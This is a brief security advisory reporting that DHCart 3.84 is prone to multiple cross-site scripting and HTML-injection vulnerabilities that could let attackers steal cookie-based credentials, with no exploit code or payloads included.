DHCart is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data.

Attacker-supplied HTML or JavaScript code could run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.

DHCart 3.84 is vulnerable; other versions may also be affected.
